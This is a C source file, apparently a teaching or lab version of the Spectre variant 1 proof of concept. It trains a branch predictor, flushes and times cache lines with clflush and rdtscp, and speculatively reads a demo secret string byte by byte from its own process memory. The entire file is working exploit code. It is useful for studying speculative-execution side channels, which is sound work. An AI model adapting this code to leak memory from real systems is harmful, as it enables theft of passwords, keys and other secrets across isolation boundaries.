#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

// used to prevent the compiler from optimizing out victim_function()
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}

/**
 * Spectre Attack Function to Read Specific Byte.
 *
 * @param malicious_x The malicious x used to call the victim_function
 *
 * @param values      The two most likely guesses returned by your attack
 *
 * @param scores      The score (larger is better) of the two most likely guesses
 */
void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
  
  // Set threshold to detect cache hits
  const int THRESHOLD = 100;
  // Array to store the cache hit counts
  static int hit_counts[256];
  // Variables for training branch predictors
  size_t training_x, call_x;
  // Variables for timing measurement
  unsigned int junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t* addr;
  // Iteration variables
  int rep, i, j, k, shuff_i;

  // Initialize all hit counts to zeros
  for (i = 0; i < 256; i++)
    hit_counts[i] = 0;

  // Repeat the atack for better precision
  for (rep = 999; rep > 0; rep--) {
    // -------------------------------------------------------------
    // Flush array2 from cache
    for (i = 0; i < 256; i++)
      _mm_clflush(&array2[i * 512]);

    // Wait several cycles for clflush to commit
    for (volatile int z = 0; z < 100; z++)
    // Memory fence
    _mm_mfence();
    
    // -------------------------------------------------------------
    // Training the branch predictors
    // 30 victim function calls: 25 training calls, 5 attack calls
    training_x = rep % array1_size;
    for (j = 0; j < 30; j++) {
      // Flush array1_size from cache to delay branch resolution
      _mm_clflush(&array1_size);
      // Wait several cycles for clflush to commit
      for (volatile int z = 0; z < 100; z++)
      // Memory fence
      _mm_mfence();

      // Decide call_x (5 training_x, 1 malicious_x) without branches
      // Set call_x=FFF.FF0000 if j%6==0, else call_x=0
      call_x = ((j % 6) - 1) & ~0xFFFF;
      // Set call_x=-1 if j%6=0, else call_x=0
      call_x = (call_x | (call_x >> 16));
      // Set call_x=training_x if j%6!=0 or malicious_x if j%6==0
      call_x = training_x ^ (call_x & (malicious_x ^ training_x));
      
      // Call the victim function
      victim_function(call_x);
    }

    // -------------------------------------------------------------
    // Timing measurement to detect cache hits
    for (i = 0; i < 256; i++)
    {
      // Shuffle the access order to trick the data prefetcher
      shuff_i = ((i * 177) + 15) & 255; // Shuffle i using a linear mapping
      addr = &array2[shuff_i * 512];
      time1 = __rdtscp(&junk);          // Get current time stamp
      junk = *addr;                     // Read the data
      time2 = __rdtscp(&junk) - time1;  // Calculate the elapsed time
      if (time2 <= THRESHOLD && shuff_i != array1[rep % array1_size])
        hit_counts[shuff_i]++;          // Increment count for a cache hit
    }

    // -------------------------------------------------------------
    // Find the top two most likely guesses
    j = k = -1;
    for (i = 0; i < 256; i++)
    {
      if (j < 0 || hit_counts[i] >= hit_counts[j])
      {
        k = j;
        j = i;
      }
      else if (k < 0 || hit_counts[i] >= hit_counts[k])
      {
        k = i;
      }
    }
  }

  // Use junk to avoid optimization
  hit_counts[0] ^= junk;
  
  // Report the results
  value[0] = (uint8_t)j;
  value[1] = (uint8_t)k;
  score[0] = hit_counts[j];
  score[1] = hit_counts[k];
}

int main(int argc, const char **argv) {
  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1); /* read the secret */
  int score[2], len = strlen(secret);
  uint8_t value[2];

  // initialize array2 to make sure it is in its own physical page and
  // not in a copy-on-write zero page
  for (size_t i = 0; i < sizeof(array2); i++)
    array2[i] = 1; 

  int count = 0;

  // attack each byte of the secret, successively
  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");

    // Count the number of guaranteed successes
    if (score[0] >= 2 * score[1])
      count++;
  }

  printf("Success count: %d / %d\n", count, (int)(strlen(secret)));
  return (0);
}
